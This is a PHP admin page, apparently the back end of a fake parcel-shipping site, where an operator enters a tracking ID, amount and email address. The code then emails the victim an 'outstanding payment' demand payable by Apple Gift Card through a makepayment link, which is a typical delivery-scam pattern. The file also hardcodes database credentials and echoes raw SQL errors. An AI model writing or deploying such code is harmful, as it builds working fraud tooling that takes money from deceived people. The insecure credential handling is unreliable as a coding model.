<?php
session_start();

use PHPMailer\PHPMailer\PHPMailer;


if(isset($_SESSION['uid'])){
 
 
 
  include '../../config/database.php';
  include '../../config/config.php';
  include 'header.php';


  $msg = "";

}
else{

    header("location:../pages/login.php");
}
?>
<div class="main-content">
    <div class="container mt-5">
        <h2>Insert Payment Data</h2>
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <div class="form-group">
                <label for="trackid">Track ID:</label>
                <input type="text" class="form-control" id="trackid" name="trackid" required>
            </div>
            <div class="form-group">
                <label for="amount">Amount:</label>
                <input type="text" class="form-control" id="amount" name="amount" required>
            </div>
            <div class="form-group">
                <label for="email">Email:</label>
                <input type="email" class="form-control" id="email" name="email" required>
            </div>
            <button type="submit" class="btn btn-primary" name="submit">Submit</button>
        </form>
    </div>
</div>

<?php
// Define database connection parameters
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'cargojij_shipping');
define('DB_PASSWORD', 'cargojij_shipping');
define('DB_NAME', 'cargojij_shipping');

// Attempt to connect to MySQL database
$conn = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if (!$conn) {
    die("ERROR: Could not connect. " . mysqli_connect_error());
}

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['submit'])) {
    // Collect values for trackid, amount, and email
    $trackid = $_POST['trackid'];
    $amount = $_POST['amount'];
    $email = $_POST['email'];

    // Insert data into the inpayment table
    $sql = "INSERT INTO inpayment (trackid, amount, email) VALUES (?, ?, ?)";
    $stmt = mysqli_prepare($conn, $sql);
    mysqli_stmt_bind_param($stmt, "sss", $trackid, $amount, $email);

    // Execute the statement
    if (mysqli_stmt_execute($stmt)) {
        // Data inserted successfully
        echo "<script>alert('Data inserted successfully.');</script>";
        
        // Send email to the user
        $to = $email;
        $subject = "Out Standing Payment";
        $message = "you have an out standing payment of $" . $amount . " make payment by Apple Gift Card using link: http://cargojiji.com/makepayment.php  using your tacking id".$trackid .".Your transaction is pending we get back to you";
        $headers = "From: contact@cargojiji.com"; // Replace with your email address
        
        // Send email
        if (mail($to, $subject, $message, $headers)) {
            echo "<script>alert('Email sent successfully.');</script>";
        } else {
            echo "<script>alert('Failed to send email.');</script>";
        }
    } else {
        echo "<script>alert('Error: " . $sql . "<br>" . mysqli_error($conn) . "');</script>";
    }

    // Close statement and connection
    mysqli_stmt_close($stmt);
    mysqli_close($conn);
}
?>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>


